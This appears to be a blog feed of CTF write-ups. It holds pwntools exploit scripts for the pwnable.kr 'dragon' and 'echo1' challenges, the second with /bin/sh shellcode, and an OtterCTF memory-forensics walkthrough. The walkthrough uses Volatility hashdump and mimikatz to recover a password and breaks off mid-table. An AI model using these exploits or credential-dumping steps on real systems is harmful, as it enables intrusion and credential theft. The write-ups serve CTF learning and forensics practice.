class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="solve-3"><a href="#solve-3" class="headerlink" title="solve"></a>solve</h2><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">import</span> time<span class="token keyword">import</span> sys<span class="token keyword">if</span> len<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token number">2</span><span class="token punctuation">:</span>    p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./dragon'</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    p <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'pwnable.kr'</span><span class="token punctuation">,</span><span class="token number">9004</span><span class="token punctuation">)</span>context<span class="token punctuation">.</span>log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token comment" spellcheck="true"># context.terminal = ['tmux', 'splitw', '-h']</span><span class="token comment" spellcheck="true"># gdb.attach(proc.pidof(p)[0],gdbscript='b *0x08048899\nc\n')</span><span class="token keyword">def</span> <span class="token function">step1</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        p<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">'1'</span><span class="token operator">+</span><span class="token string">'\n'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">step2</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        p<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">'3'</span><span class="token operator">+</span><span class="token string">'\n'</span><span class="token punctuation">)</span>        p<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">'3'</span><span class="token operator">+</span><span class="token string">'\n'</span><span class="token punctuation">)</span>        p<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">'2'</span><span class="token operator">+</span><span class="token string">'\n'</span><span class="token punctuation">)</span>step1<span class="token punctuation">(</span>p<span class="token punctuation">)</span>p<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">'1'</span><span class="token operator">+</span><span class="token string">'\n'</span><span class="token punctuation">)</span>step2<span class="token punctuation">(</span>p<span class="token punctuation">)</span>p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>p32<span class="token punctuation">(</span><span class="token number">0x08048dbf</span><span class="token punctuation">)</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="flag-3"><a href="#flag-3" class="headerlink" title="flag"></a>flag</h2><pre class="line-numbers language-bash"><code class="language-bash">MaMa, Gandhi was right<span class="token operator">!</span> :<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h1 id="5-echo1"><a href="#5-echo1" class="headerlink" title="5.echo1"></a>5.echo1</h1><h2 id="solve-4"><a href="#solve-4" class="headerlink" title="solve"></a>solve</h2><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>p <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'pwnable.kr'</span><span class="token punctuation">,</span> <span class="token number">9010</span><span class="token punctuation">)</span>jmp_esp <span class="token operator">=</span> asm<span class="token punctuation">(</span><span class="token string">"jmp rsp"</span><span class="token punctuation">,</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">)</span>shellcode<span class="token operator">=</span><span class="token string">"\x31\xf6\xf7\xe6\x52\x52\x52\x54\x5b\x53\x5f\xc7\x07\x2f\x62\x69\x6e\xc7\x47\x04\x2f\x2f\x73\x68\x40\x75\x04\xb0\x3b\x0f\x05\x31\xc9\xb0\x0b\xcd\x80"</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'name? :'</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>jmp_esp<span class="token punctuation">)</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'>'</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'1'</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> <span class="token string">'A'</span><span class="token operator">*</span> <span class="token number">40</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x6020a0</span><span class="token punctuation">)</span> <span class="token operator">+</span> shellcodep<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'goodbye'</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="flag-4"><a href="#flag-4" class="headerlink" title="flag"></a>flag</h2><pre class="line-numbers language-bash"><code class="language-bash">H4d_som3_fun_w1th_ech0_ov3rfl0w<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> bin </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> pwnable.kr </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>otterctf_memory_forensics</title>
      <link href="/2018/12/11/otterctf-memory-forensics/"/>
      <url>/2018/12/11/otterctf-memory-forensics/</url>
      
        <content type="html"><![CDATA[<h1 id="1-What-the-password-100"><a href="#1-What-the-password-100" class="headerlink" title="1. What the password? 100"></a>1. What the password? 100</h1><h2 id="question"><a href="#question" class="headerlink" title="question"></a>question</h2><p>you got a sample of rick’s PC’s memory. can you get his user password? format: CTF{…}</p><p>Alternative download link: <a href="https://mega.nz/#!sh8wmCIL!b4tpech4wzc3QQ6YgQ2uZnOmctRZ2duQxDqxbkWYipQ">https://mega.nz/#!sh8wmCIL!b4tpech4wzc3QQ6YgQ2uZnOmctRZ2duQxDqxbkWYipQ</a></p><h2 id="solve"><a href="#solve" class="headerlink" title="solve"></a>solve</h2><p>看到Memory_Forensics，无脑上volatility<br>先在国外服务器起docker-kali，发现没有volatility</p><a id="more"></a><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">apt-get</span> update<span class="token operator">&amp;&amp;</span> <span class="token function">apt-get</span> <span class="token function">install</span> volatility -y<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>首先看imageinfo</p><pre class="line-numbers language-bash"><code class="language-bash">➜  Desktop volatility -f OtterCTF.vmem --profile<span class="token operator">=</span>Win7SP1x64 imageinfo                                                Volatility Foundation Volatility Framework 2.6INFO    <span class="token keyword">:</span> volatility.debug    <span class="token keyword">:</span> Determining profile based on KDBG search<span class="token punctuation">..</span>.          Suggested Profile<span class="token punctuation">(</span>s<span class="token punctuation">)</span> <span class="token keyword">:</span> Win7SP1x64, Win7SP0x64, Win2008R2SP0x64, Win2008R2SP1x64_23418, Win2008R2SP1x64, Win7SP1x64_23418                     AS Layer1 <span class="token keyword">:</span> WindowsAMD64PagedMemory <span class="token punctuation">(</span>Kernel AS<span class="token punctuation">)</span>                     AS Layer2 <span class="token keyword">:</span> FileAddressSpace <span class="token punctuation">(</span>/root/Desktop/OtterCTF.vmem<span class="token punctuation">)</span>                      PAE <span class="token function">type</span> <span class="token keyword">:</span> No PAE                           DTB <span class="token keyword">:</span> 0x187000L                          KDBG <span class="token keyword">:</span> 0xf80002c430a0L          Number of Processors <span class="token keyword">:</span> 2     Image Type <span class="token punctuation">(</span>Service Pack<span class="token punctuation">)</span> <span class="token keyword">:</span> 1                KPCR <span class="token keyword">for</span> CPU 0 <span class="token keyword">:</span> 0xfffff80002c44d00L                KPCR <span class="token keyword">for</span> CPU 1 <span class="token keyword">:</span> 0xfffff880009ef000L             KUSER_SHARED_DATA <span class="token keyword">:</span> 0xfffff78000000000L           Image <span class="token function">date</span> and <span class="token function">time</span> <span class="token keyword">:</span> 2018-08-04 19:34:22 UTC+0000     Image local <span class="token function">date</span> and <span class="token function">time</span> <span class="token keyword">:</span> 2018-08-04 22:34:22 +0300<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>由于要密码，很简单，直接dumphash</p><pre class="line-numbers language-bash"><code class="language-bash">➜  Desktop volatility -f OtterCTF.vmem --profile<span class="token operator">=</span>Win7SP1x64 hashdump                                                         Volatility Foundation Volatility Framework 2.6Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::Rick:1000:aad3b435b51404eeaad3b435b51404ee:518172d012f97d3a8fcc089615283940:::<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>拿<code>518172d012f97d3a8fcc089615283940</code>去解hash发现不对，hash解出来是空密码，flag不对。大佬说是两段hash，后面的没出来，就用python源码的Volatility+mimikatz吧</p><pre class="line-numbers language-zsh"><code class="language-zsh">wget http://downloads.volatilityfoundation.org/releases/2.6/volatility-2.6.zipunzip volatility-2.6.zipwget https://github.com/volatilityfoundation/community/raw/master/FrancescoPicasso/mimikatz.pycp mimikatz.py ./volatility-master/volatility/plugins/➜  volatility-master python vol.py  -f ../OtterCTF.vmem --profile=Win7SP1x64 mimikatz Volatility Foundation Volatility Framework 2.6*** Failed to import volatility.plugins.mimikatz (AttributeError: 'module' object has no attribute 'ULInt32')ERROR   : volatility.debug    : You must specify something to do (try -h)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>发现有错误，单独跑下mimakatz</p><pre class="line-numbers language-zsh"><code class="language-zsh">➜  volatility-master python ./plugin/mimikatz.pyc Traceback (most recent call last):  File "/root/Desktop/volatility-master/plugin/mimikatz.py", line 171, in <module>  File "/root/Desktop/volatility-master/plugin/mimikatz.py", line 182, in LsaDecryptorAttributeError: 'module' object has no attribute 'ULInt32'<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>mimikatz的锅，找到方法</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">sudo</span> pip uninstall construct<span class="token function">sudo</span> pip <span class="token function">install</span> construct<span class="token operator">==</span>2.5.5-reupload<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>走起</p><pre class="line-numbers language-bash"><code class="language-bash">➜  volatility-master python vol.py  -f <span class="token punctuation">..</span>/OtterCTF.vmem --profile<span class="token operator">=</span>Win7SP1x64 mimikatzVolatility Foundation Volatility Framework 2.6Module   User             Domain           Password                                -------- ---------------- ---------------- ----------------------------------------wdigest  Rick             WIN-LO6FAF3DTFE  MortyIsReallyAnOtter                    wdigest  WIN-LO6FAF3DTFE$ WORKGROUP                                                <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="flag"><a href="#flag" class="headerlink" title="flag"></a>flag</h2><pre><code>第一关flag：CTF&amp;#123;MortyIsReallyAnOtter&amp;#125;</code></pre><h1 id="2-General-Info-75"><a href="#2-General-Info-75" class="headerlink" title="2 - General Info 75"></a>2 - General Info 75</h1><p>##question<br>Let’s start easy - whats the PC’s name and IP address?<br>format: CTF{flag}</p><p>##solve<br>要ip地址，netscan走一波吧</p><pre class="line-numbers language-bash"><code class="language-bash">➜  volatility-master python vol.py  -f <span class="token punctuation">..</span>/OtterCTF.vmem --profile<span class="token operator">=</span>Win7SP1x64 netscan Volatility Foundation Volatility Framework 2.6Offset<span class="token punctuation">(</span>P<span class="token punctuation">)</span>          Proto    Local Address                  Foreign Address      State            Pid      Owner          Created0x7d60f010         UDPv4    0.0.0.0:1900                   *:*                                   2836     BitTorrent.exe 2018-08-04 19:27:17 UTC+00000x7d62b3f0         UDPv4    192.168.202.131:6771           *:*                                   2836     BitTorrent.exe 2018-08-04 19:27:22 UTC+00000x7d62f4c0         UDPv4    127.0.0.1:62307                *:*                                   2836     BitTorrent.exe 2018-08-04 19:27:17 UTC+00000x7d62f920         UDPv4    192.168.202.131:62306          *:*                                   2836     BitTorrent.exe 2018-08-04 19:27:17 UTC+0000<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>主机名，先看注册表</p><pre><code>➜  volatility-master python vol.py  -f ../OtterCTF.vmem --profile=Win7SP1x64 hivelistVolatility Foundation Volatility Framework 2.6Virtual            Physical           Name------------------ ------------------ ----0xfffff8a00377d2d0 0x00000000624162d0 \??\C:\System Volume Information\Syscache.hve0xfffff8a00000f010 0x000000002d4c1010 [no name]0xfffff8a000024010 0x000000002d50c010 \REGISTRY\MACHINE\SYSTEM0xfffff8a000053320 0x000000002d5bb320 \REGISTRY\MACHINE\HARDWARE0xfffff8a000109410 0x0000000029cb4410 \SystemRoot\System32\Config\SECURITY0xfffff8a00033d410 0x000000002a958410 \Device\HarddiskVolume1\Boot\BCD0xfffff8a0005d5010 0x000000002a983010 \SystemRoot\System32\Config\SOFTWARE0xfffff8a001495010 0x0000000024912010 \SystemRoot\System32\Config\DEFAULT0xfffff8a0016d4010 0x00000000214e1010 \SystemRoot\System32\Config\SAM0xfffff8a00175b010 0x00000000211eb010 \??\C:\Windows\ServiceProfiles\NetworkService\NTUSER.DAT0xfffff8a00176e410 0x00000000206db410 \??\C:\Windows\ServiceProfiles\LocalService\NTUSER.DAT0xfffff8a002090010 0x000000000b92b010 \??\C:\Users\Rick\ntuser.dat0xfffff8a0020ad410 0x000000000db41410 \??\C:\Users\Rick\AppData\Local\Microsoft\Windows\UsrClass.dat</code></pre><p>看到system。。。不用想了，接着干</p><pre class="line-numbers language-bash"><code class="language-bash">➜  volatility-master python vol.py  -f <span class="token punctuation">..</span>/OtterCTF.vmem --profile<span class="token operator">=</span>Win7SP1x64 -o 0xfffff8a000024010 printkeyVolatility Foundation Volatility Framework 2.6Legend: <span class="token punctuation">(</span>S<span class="token punctuation">)</span> <span class="token operator">=</span> Stable   <span class="token punctuation">(</span>V<span class="token punctuation">)</span> <span class="token operator">=</span> Volatile----------------------------Registry: \REGISTRY\MACHINE\SYSTEMKey name: CMI-CreateHive<span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;2A7FB991-7BBE-4F9D-B91E-7CB51D4737F5&amp;#125; (S)</span>Last updated: 2018-08-04 19:25:54 UTC+0000Subkeys:  <span class="token punctuation">(</span>S<span class="token punctuation">)</span> ControlSet001  <span class="token punctuation">(</span>S<span class="token punctuation">)</span> ControlSet002  <span class="token punctuation">(</span>S<span class="token punctuation">)</span> MountedDevices  <span class="token punctuation">(</span>S<span class="token punctuation">)</span> RNG  <span class="token punctuation">(</span>S<span class="token punctuation">)</span> Select  <span class="token punctuation">(</span>S<span class="token punctuation">)</span> Setup  <span class="token punctuation">(</span>S<span class="token punctuation">)</span> Software  <span class="token punctuation">(</span>S<span class="token punctuation">)</span> WPA  <span class="token punctuation">(</span>V<span class="token punctuation">)</span> CurrentControlSetValues:<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-bash"><code class="language-bash">➜  volatility-master python vol.py  -f <span class="token punctuation">..</span>/OtterCTF.vmem --profile<span class="token operator">=</span>Win7SP1x64 -o 0xfffff8a000024010 printkey -K <span class="token string">"ControlSet001"</span>Volatility Foundation Volatility Framework 2.6Legend: <span class="token punctuation">(</span>S<span class="token punctuation">)</span> <span class="token operator">=</span> Stable   <span class="token punctuation">(</span>V<span class="token punctuation">)</span> <span class="token operator">=</span> Volatile----------------------------Registry: \REGISTRY\MACHINE\SYSTEMKey name: ControlSet001 <span class="token punctuation">(</span>S<span class="token punctuation">)</span>Last updated: 2018-06-02 19:23:00 UTC+0000Subkeys:  <span class="token punctuation">(</span>S<span class="token punctuation">)</span> Control  <span class="token punctuation">(</span>S<span class="token punctuation">)</span> Enum  <span class="token punctuation">(</span>S<span class="token punctuation">)</span> Hardware Profiles  <span class="token punctuation">(</span>S<span class="token punctuation">)</span> Policies  <span class="token punctuation">(</span>S<span class="token punctuation">)</span> servicesValues:<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>就这样一个一个解析注册表,到最后</p><pre class="line-numbers language-bash"><code class="language-bash">➜  volatility-master python vol.py  -f <span class="token punctuation">..</span>/OtterCTF.vmem --profile<span class="token operator">=</span>Win7SP1x64 -o 0xfffff8a000024010 printkey -K <span class="token string">"ControlSet001\Control\ComputerName\ComputerName"</span>Volatility Foundation Volatility Framework 2.6Legend: <span class="token punctuation">(</span>S<span class="token punctuation">)</span> <span class="token operator">=</span> Stable   <span class="token punctuation">(</span>V<span class="token punctuation">)</span> <span class="token operator">=</span> Volatile----------------------------Registry: \REGISTRY\MACHINE\SYSTEMKey name: ComputerName <span class="token punctuation">(</span>S<span class="token punctuation">)</span>Last updated: 2018-06-02 19:23:00 UTC+0000Subkeys:Values:REG_SZ                        <span class="token keyword">:</span> <span class="token punctuation">(</span>S<span class="token punctuation">)</span> mnmsrvcREG_SZ        ComputerName    <span class="token keyword">:</span> <span class="token punctuation">(</span>S<span class="token punctuation">)</span> WIN-LO6FAF3DTFE<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>##flag</p><pre class="line-numbers language-bash"><code class="language-bash">CTF<span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;WIN-LO6FAF3DTFE&amp;#125;</span>CTF<span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;192.168.202.131&amp;#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h1 id="3-Play-Time-50"><a href="#3-Play-Time-50" class="headerlink" title="3 - Play Time 50"></a>3 - Play Time 50</h1><p>##question<br>Rick just loves to play some good old videogames. can you tell which game is he playing? whats the IP address of the server?</p><p>format: CTF{flag}</p><p>##solve<br>netscan 中发现有个进程不认识，google下LunarMS，是个游戏，over</p><pre class="line-numbers language-bash"><code class="language-bash">➜  volatility-master python vol.py  -f <span class="token punctuation">..</span>/OtterCTF.vmem --profile<span class="token operator">=</span>Win7SP1x64 netscan                                        Volatility Foundation Volatility Framework 2.6Offset<span class="token punctuation">(</span>P<span class="token punctuation">)</span>          Proto    Local Address                  Foreign Address      State            Pid      Owner          Created0x7d60f010         UDPv4    0.0.0.0:1900                   *:*                                   2836     BitTorrent.exe 2018-08-04 19:27:17 UTC+00000x7d62b3f0         UDPv4    192.168.202.131:6771           *:*                                   2836     BitTorrent.exe 2018-08-04 19:27:22 UTC+00000x7d62f4c0         UDPv4    127.0.0.1:62307                *:*                                   2836     BitTorrent.exe 2018-08-04 19:27:17 UTC+00000x7d62f920         UDPv4    192.168.202.131:62306          *:*                                   2836     BitTorrent.exe 2018-08-04 19:27:17 UTC+00000x7d6424c0         UDPv4    0.0.0.0:50762                  *:*                                   4076     chrome.exe     2018-08-04 19:33:37 UTC+00000x7d6b4250         UDPv6    ::1:1900                       *:*                                   164      svchost.exe    2018-08-04 19:28:42 UTC+00000x7d6e3230         UDPv4    127.0.0.1:6771                 *:*                                   2836     BitTorrent.exe 2018-08-04 19:27:22 UTC+00000x7d6ed650         UDPv4    0.0.0.0:5355                   *:*                                   620      svchost.exe    2018-08-04 19:34:22 UTC+00000x7d71c8a0         UDPv4    0.0.0.0:0                      *:*                                   868      svchost.exe    2018-08-04 19:34:22 UTC+00000x7d71c8a0         UDPv6    :::0                           *:*                                   868      svchost.exe    2018-08-04 19:34:22 UTC+00000x7d74a390         UDPv4    127.0.0.1:52847                *:*                                   2624     bittorrentie.e 2018-08-04 19:27:24 UTC+00000x7d7602c0         UDPv4    127.0.0.1:52846                *:*                                   2308     bittorrentie.e 2018-08-04 19:27:24 UTC+00000x7d787010         UDPv4    0.0.0.0:65452                  *:*                                   4076     chrome.exe     2018-08-04 19:33:42 UTC+00000x7d789b50         UDPv4    0.0.0.0:50523                  *:*                                   620      svchost.exe    2018-08-04 19:34:22 UTC+00000x7d789b50         UDPv6    :::50523                       *:*                                   620      svchost.exe    2018-08-04 19:34:22 UTC+00000x7d92a230         UDPv4    0.0.0.0:0                      *:*                                   868      svchost.exe    2018-08-04 19:34:22 UTC+00000x7d92a230         UDPv6    :::0                           *:*                                   868      svchost.exe    2018-08-04 19:34:22 UTC+00000x7d9e8b50         UDPv4    0.0.0.0:20830                  *:*                                   2836     BitTorrent.exe 2018-08-04 19:27:15 UTC+00000x7d9f4560         UDPv4    0.0.0.0:0                      *:*                                   3856     WebCompanion.e 2018-08-04 19:34:22 UTC+00000x7d9f8cb0         UDPv4    0.0.0.0:20830                  *:*                                   2836     BitTorrent.exe 2018-08-04 19:27:15 UTC+00000x7d9f8cb0         UDPv6    :::20830                       *:*                                   2836     BitTorrent.exe 2018-08-04 19:27:15 UTC+00000x7d8bb390         TCPv4    0.0.0.0:9008                   0.0.0.0:0            LISTENING        4        System         0x7d8bb390         TCPv6    :::9008                        :::0                 LISTENING        4        System         0x7d9a9240         TCPv4    0.0.0.0:8733                   0.0.0.0:0            LISTENING        4        System         0x7d9a9240         TCPv6    :::8733                        :::0                 LISTENING        4        System         0x7d9e19e0         TCPv4    0.0.0.0:20830                  0.0.0.0:0            LISTENING        2836     BitTorrent.exe 0x7d9e19e0         TCPv6    :::20830                       :::0                 LISTENING        2836     BitTorrent.exe 0x7d9e1c90         TCPv4    0.0.0.0:20830                  0.0.0.0:0            LISTENING        2836     BitTorrent.exe 0x7d42ba90         TCPv4    -:0                            56.219.196.26:0      CLOSED           2836     BitTorrent.exe 0x7d6124d0         TCPv4    192.168.202.131:49530          77.102.199.102:7575  CLOSED           708      LunarMS.exe    0x7d62d690         TCPv4    192.168.202.131:49229          169.1.143.215:8999   CLOSED           2836     BitTorrent.exe 0x7d634350         TCPv6    -:0                            38db:c41a:80fa:ffff:38db:c41a:80fa:ffff:0 CLOSED           2836     BitTorrent.exe   <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>##flag</p><pre class="line-numbers language-bash"><code class="language-bash">CTF<span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;LunarMS&amp;#125;</span>CTF<span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;77.102.199.102&amp;#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h1 id="4-Name-Game-100"><a href="#4-Name-Game-100" class="headerlink" title="4 - Name Game 100"></a>4 - Name Game 100</h1><p>##question<br>We know that the account was logged in to a channel called Lunar-3. what is the account name?</p><p>format: CTF{flag}</p><p>##solve<br>如果他登陆了，必定存入了Lunar到vmem中，尝试找找Lunar-3 </p><pre class="line-numbers language-bash"><code class="language-bash">➜  Desktop strings OtterCTF.vmem<span class="token operator">|</span><span class="token function">grep</span> Lunar-3          Lunar-3Lunar-3<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>显示找到的前三行后三行</p><pre class="line-numbers language-bash"><code class="language-bash">➜  Desktop strings OtterCTF.vmem<span class="token operator">|</span><span class="token function">grep</span> Lunar-3 -A 3 -B 3disabledmouseOverkeyFocusedLunar-30tt3r8r33z3Sound/UI.img/BtMouseClick--c+Yttb+Y4c+Yb+YLc+YLunar-3Lunar-4L<span class="token punctuation">(</span>dNVxdNVL<span class="token operator">|</span>eNV<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>##flag</p><pre class="line-numbers language-bash"><code class="language-bash">CTF<span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;0tt3r8r33z3&amp;#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h1 id="5-Name-Game-2-150"><a href="#5-Name-Game-2-150" class="headerlink" title="5 - Name Game 2 150"></a>5 - Name Game 2 150</h1><p>##question<br>From a little research we found that the username of the logged on character is always after this signature: 0x64 0x??{6-8} 0x40 0x06 0x??{18} 0x5a 0x0c 0x00{2} What’s rick’s character’s name? format: CTF{…}</p><p>##solve<br>先看下进程</p><pre class="line-numbers language-bash"><code class="language-bash">➜  Desktop volatility -f OtterCTF.vmem --profile<span class="token operator">=</span>Win7SP1x64 psscan  Volatility Foundation Volatility Framework 2.6Offset<span class="token punctuation">(</span>P<span class="token punctuation">)</span>          Name                PID   PPID PDB                Time created                   Time exited                   ------------------ ---------------- ------ ------ ------------------ ------------------------------ ------------------------------0x000000007d403610 mscorsvw.exe        412    492 0x0000000040d28000 2018-08-04 19:28:42 UTC+0000                                 0x000000007d686b30 Rick And Morty     3820   2728 0x000000000b59a000 2018-08-04 19:32:55 UTC+0000                                 0x000000007d6a7b30 bittorrentie.e     2308   2836 0x0000000076ada000 2018-08-04 19:27:19 UTC+0000                                 0x000000007d6c9b30 bittorrentie.e     2624   2836 0x00000000761f5000 2018-08-04 19:27:21 UTC+0000                                 0x000000007d7cb740 LunarMS.exe         708   2728 0x00000000731cb000 2018-08-04 19:27:39 UTC+0000                                 0x000000007d832060 sppsvc.exe         2500    492 0x000000000ae7b000 2018-08-04 19:26:58 UTC+0000                                 0x000000007d87e060 explorer.exe       2728   2696 0x000000000873f000 2018-08-04 19:27:04 UTC+0000                                 0x000000007d890b30 BitTorrent.exe     2836   2728 0x0000000006c2e000 2018-08-04 19:27:07 UTC+0000                                 0x000000007d8f02e0 WebCompanion.e     2844   2728 0x0000000006619000 2018-08-04 19:27:07 UTC+0000   2018-08-04 19:33:33 UTC+0000  0x000000007d9aab30 SearchIndexer.     3064    492 0x0000000079a02000 2018-08-04 19:27:14 UTC+0000                                 0x000000007da8f060 sc.exe             3208   3880 0x000000006fe9a000 2018-08-04 19:33:47 UTC+0000   2018-08-04 19:33:48 UTC+0000  0x000000007db12060 WmiPrvSE.exe       2136    604 0x0000000073b40000 2018-08-04 19:26:51 UTC+0000                                 0x000000007db8f060 WebCompanionIn     3880   1484 0x0000000043242000 2018-08-04 19:33:07 UTC+0000                                 0x000000007dbcdb30 vmtoolsd.exe       2804   2728 0x00000000074c6000 2018-08-04 19:27:06 UTC+0000                                 0x000000007dbe9b30 taskhost.exe       2344    492 0x000000000b824000 2018-08-04 19:26:57 UTC+0000                                 0x000000007dbfab30 dwm.exe            2704    844 0x0000000008a6d000 2018-08-04 19:27:04 UTC+0000                                 0x000000007dbfd960 notepad.exe        3304   3132 0x000000007207d000 2018-08-04 19:34:10 UTC+0000                                 0x000000007dc0f630 VGAuthService.     1356    492 0x0000000018f8b000 2018-08-04 19:26:25 UTC+0000                                 0x000000007dc7f630 dllhost.exe        1324    492 0x000000001030d000 2018-08-04 19:26:42 UTC+0000                                 0x000000007dc92920 vmtoolsd.exe       1428    492 0x0000000017f54000 2018-08-04 19:26:27 UTC+0000                                 0x000000007dcb6890 sc.exe              452   3880 0x000000005f76a000 2018-08-04 19:33:48 UTC+0000   2018-08-04 19:33:48 UTC+0000  0x000000007dce7b30 SearchFilterHo     2740   3064 0x000000002fa16000 2018-08-04 19:33:11 UTC+0000   2018-08-04 19:34:22 UTC+0000  0x000000007dde7800 svchost.exe        1948    492 0x0000000076d80000 2018-08-04 19:26:42 UTC+0000                                 0x000000007ddf3b30 msdtc.exe          1436    492 0x000000000fcd5000 2018-08-04 19:26:43 UTC+0000                                 0x000000007de01060 sc.exe             2028   3880 0x0000000077e22000 2018-08-04 19:33:49 UTC+0000   2018-08-04 19:34:03 UTC+0000  0x000000007de2e9e0 svchost.exe         808    492 0x000000001fe6a000 2018-08-04 19:26:18 